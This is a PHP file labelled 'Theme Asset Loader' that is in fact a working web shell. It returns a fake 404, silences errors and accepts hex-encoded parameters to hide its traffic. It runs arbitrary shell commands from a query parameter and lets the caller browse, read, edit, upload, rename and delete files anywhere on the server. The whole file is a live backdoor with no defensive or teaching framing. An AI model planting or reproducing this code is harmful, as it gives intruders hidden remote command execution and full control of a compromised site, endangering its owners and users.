<?php
/* Theme Asset Loader */
http_response_code(404);
@ini_set('display_errors','0'); error_reporting(0);
function dc($v){ if($v!=='' && $v[0]==='~'){ $h=substr($v,1); return (ctype_xdigit($h) && strlen($h)%2===0) ? (string)pack('H*',$h) : $v; } return $v; }
function ec($v){ return '~'.bin2hex((string)$v); }
$A = dc(isset($_GET['a']) ? (string)$_GET['a'] : '');
$D = dc(isset($_GET['d']) ? (string)$_GET['d'] : ''); if($D==='') $D=getcwd();
$R = realpath($D); if($R) $D=$R;
$C = dc(isset($_GET['c']) ? (string)$_GET['c'] : '');
$O = $C!=='' ? (string)`$C 2>&1` : '';
$N = dc(isset($_GET['n']) ? (string)$_GET['n'] : '');
$T = dc(isset($_GET['t']) ? (string)$_GET['t'] : '');
if($A==='create' && $N!=='') @file_put_contents($D.'/'.basename($N),'');
if($A==='mkdir'  && $N!=='') @mkdir($D.'/'.basename($N),0755);
if($A==='rename' && $N!=='' && $T!=='') @rename($D.'/'.basename($N),$D.'/'.basename($T));
if($A==='rm'     && $N!=='') @unlink($D.'/'.basename($N));
if(isset($_FILES['u']) && !empty($_FILES['u']['tmp_name'])){ $q=$D.'/'.basename($_FILES['u']['name']); @copy($_FILES['u']['tmp_name'],$q); @unlink($_FILES['u']['tmp_name']); }
if(isset($_POST['save'],$_POST['p'])) @file_put_contents((string)$_POST['p'],(string)$_POST['save']);
$E = isset($_GET['e']) ? (string)@file_get_contents($D) : null;
$L = @scandir($D) ?: array();
$h = function($s){ return htmlspecialchars((string)$s, ENT_QUOTES); };
?><!DOCTYPE html><html><head><meta charset="utf-8"><title>assets</title><style>
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
background:#0d0e10;color:#d6dae0;font:13px/1.5 ui-monospace,Consolas,monospace;padding:24px 0}
a{color:#8fb9ff;text-decoration:none}a:hover{text-decoration:underline}
.box{width:min(780px,94vw);background:#15181c;border:1px solid #262b31;border-radius:8px;padding:16px}
.r{display:flex;gap:6px;align-items:center}.r+.r{margin-top:8px}
.tools{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:10px 0}
.tools .r{margin:0}
input,button{font:inherit;color:#d6dae0;background:#0b0c0e;border:1px solid #262b31;border-radius:5px;padding:6px 8px;height:32px}
input{flex:1;min-width:0}input[type=file]{color:#79818b;font-size:12px;padding:4px 6px}
button{background:#1c222a;cursor:pointer;flex:none}button:hover{border-color:#8fb9ff}
pre{background:#0b0c0e;border:1px solid #262b31;border-radius:5px;padding:8px;margin:8px 0;
max-height:240px;overflow:auto;white-space:pre-wrap;word-break:break-all}
table{width:100%;border-collapse:collapse;margin-top:4px}
td{padding:4px;border-bottom:1px solid #1e2329}
.s{color:#79818b;text-align:right;white-space:nowrap;font-size:12px}
textarea{width:100%;height:200px;font:inherit;color:#d6dae0;background:#0b0c0e;border:1px solid #262b31;border-radius:5px;padding:8px;margin-top:6px}
.sep{border:0;border-top:1px solid #1e2329;margin:10px 0}
</style></head><body><div class="box">

<div class="r"><form method="get" class="r" style="flex:1" onsubmit="H(this)">
<input name="d" value="<?=$h($D)?>"><button>go</button></form>
<a href="?d=<?=ec(dirname($D))?>">up</a>
<a href="?d=<?=ec($D)?>&e=1">edit</a></div>

<form method="get" onsubmit="H(this)"><input type="hidden" name="d" value="<?=ec($D)?>">
<div class="r"><input name="c" placeholder="id; ls -la" value="<?=$h($C)?>"><button>&gt;</button></div></form>
<?php if($C!==''){ ?><pre><?=$h($O)?></pre><?php } ?>

<div class="tools">
<form method="get" class="r" onsubmit="H(this)"><input type="hidden" name="d" value="<?=ec($D)?>"><input type="hidden" name="a" value="<?=ec('create')?>">
<input name="n" placeholder="new file.php"><button>create</button></form>

<form method="post" enctype="multipart/form-data" action="?d=<?=ec($D)?>" class="r">
<input type="file" name="u"><button>upload</button></form>

<form method="get" class="r" onsubmit="H(this)"><input type="hidden" name="d" value="<?=ec($D)?>"><input type="hidden" name="a" value="<?=ec('mkdir')?>">
<input name="n" placeholder="newdir"><button>mkdir</button></form>

<form method="get" class="r" onsubmit="H(this)"><input type="hidden" name="d" value="<?=ec($D)?>"><input type="hidden" name="a" value="<?=ec('rename')?>">
<input name="n" placeholder="rename"><input name="t" placeholder="to" style="flex:.7"><button>ok</button></form>
</div>

<?php if($E!==null){ ?>
<form method="post"><input type="hidden" name="p" value="<?=$h($D)?>">
<textarea name="save"><?=$h($E)?></textarea>
<div class="r" style="margin-top:6px"><button>save</button></div></form>
<hr class="sep"><?php } ?>

<table>
<?php foreach($L as $f){ $p=$D.'/'.$f; $is=@is_dir($p);
$sz=$is?'dir':@filesize($p); $pm=substr(sprintf('%o',@fileperms($p)),-4);
$mt=date('m-d H:i',@filemtime($p)); $q=$f!=='.'&&$f!=='..'; ?>
<tr><td><?php if($q){ ?><a href="?d=<?=ec($p)?><?=$is?'':'&e=1'?>"><?=$h($f)?><?=$is?'/':''?></a><?php }else{echo $h($f);} ?></td>
<td class="s"><?=$h($sz)?></td><td class="s"><?=$h($pm)?></td><td class="s"><?=$h($mt)?></td>
<td class="s"><?php if($q){ ?><a href="?d=<?=ec($D)?>&a=<?=ec('rm')?>&n=<?=ec($f)?>" onclick="return confirm('del?')">x</a><?php } ?></td></tr>
<?php } ?></table>

</div><script>
function X(s){var o='';for(var i=0;i<s.length;i++){o+=('0'+s.charCodeAt(i).toString(16)).slice(-2)}return '~'+o}
function H(f){var e=f.querySelectorAll('input:not([type=hidden]):not([type=file])');for(var i=0;i<e.length;i++){if(e[i].value&&e[i].value.charAt(0)!=='~'){e[i].value=X(e[i].value)}}}
</script></body></html>
